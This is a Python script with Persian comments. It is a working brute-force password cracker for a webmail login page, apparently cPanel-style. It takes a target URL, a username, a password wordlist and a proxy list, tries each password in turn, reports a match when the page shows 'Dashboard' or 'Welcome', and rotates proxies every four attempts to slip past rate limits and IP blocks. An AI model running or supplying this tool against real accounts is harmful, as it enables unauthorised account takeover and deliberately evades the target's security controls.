import requests
from bs4 import BeautifulSoup
import sys
import time
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# خواندن لیست پروکسی‌ها از فایل txt
def load_proxies(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            proxies = file.read().splitlines()
        return [{'https': f'http://{proxy}'} for proxy in proxies]
    except FileNotFoundError:
        print(f"File {file_path} not found.")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading the file: {e}")
        sys.exit(1)

# شمارنده برای تعداد درخواست‌ها با هر پروکسی
request_counter = 0

# تعداد درخواست‌های مجاز با هر پروکسی قبل از چرخش
max_requests_per_proxy = 4

# اندیس پروکسی فعلی
current_proxy_index = 0

# تابع برای ایجاد یک نشست با قابلیت بازگشت (Retry) و پروکسی
def get_session(proxies=None):
    session = requests.Session()
    retries = Retry(
        total=5,  # تعداد دفعات تلاش مجاز
        backoff_factor=1,  # زمان انتظار بین تلاش‌ها
        status_forcelist=[500, 502, 503, 504],  # کدهای وضعیتی که نیاز به تلاش مجدد دارند
        respect_retry_after_header=False
    )
    session.mount('https://', HTTPAdapter(max_retries=retries))
    if proxies:
        session.proxies = proxies
    return session

# تابع برای تست لاگین
def test_login(target_url, username, password, session):
    try:
        # ارسال درخواست GET برای دریافت کوکی‌ها (در صورت نیاز)
        response = session.get(target_url, timeout=30)
        
        # بررسی وضعیت پاسخ
        if response.status_code != 200:
            print(f"Error connecting to the site. Status code: {response.status_code}")
            return False
        
        # ارسال درخواست POST برای لاگین
        login_data = {
            "user": username,
            "pass": password
        }
        
        # فرض می‌کنیم آدرس لاگین همان آدرس هدف است اما با "login.cgi" به جای "webmaillogout.cgi"
        login_url = target_url.replace("webmaillogout.cgi", "login.cgi")
        response = session.post(login_url, data=login_data, timeout=30, allow_redirects=True)
        
        # بررسی وضعیت پاسخ
        if response.status_code == 200:
            # تجزیه پاسخ برای بررسی موفقیت‌آمیز بودن لاگین
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # جستجوی نشانگر خاصی از موفقیت‌آمیز بودن لاگین
            if "Dashboard" in soup.text or "Welcome" in soup.text:
                print(f"\033[92mCorrect password found: {password}\033[0m")  # چاپ با رنگ سبز
                return True
            else:
                print(f"Incorrect password: {password}")
                return False
        else:
            print(f"Error sending login request. Status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to the server: {e}")
        return False

# تابع اصلی
def main():
    # دریافت ورودی‌ها از کاربر
    target_url = input("Please enter the target URL: ").strip()
    username = input("Please enter the username: ").strip()
    password_list_path = input("Please enter the path to the password list file: ").strip()
    proxy_list_path = input("Please enter the path to the proxy list file: ").strip()
    
    # خواندن لیست پسوردها از فایل
    try:
        with open(password_list_path, 'r', encoding='utf-8') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"File {password_list_path} not found.")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading the file: {e}")
        sys.exit(1)
    
    # خواندن لیست پروکسی‌ها از فایل
    proxies_list = load_proxies(proxy_list_path)
    
    # تست تمام پسوردها
    global request_counter, current_proxy_index
    for password in passwords:
        # ایجاد نشست با پروکسی فعلی
        session = get_session(proxies=proxies_list[current_proxy_index])
        
        # تست لاگین
        if test_login(target_url, username, password, session):
            break
        
        # افزایش شمارنده درخواست‌ها
        request_counter += 1
        
        # چرخش پروکسی پس از هر ۴ درخواست
        if request_counter >= max_requests_per_proxy:
            current_proxy_index = (current_proxy_index + 1) % len(proxies_list)
            request_counter = 0
            print(f"Switching to proxy: {proxies_list[current_proxy_index]}")
        
        # تاخیر بین درخواست‌ها
        time.sleep(2)

if __name__ == "__main__":
    main()
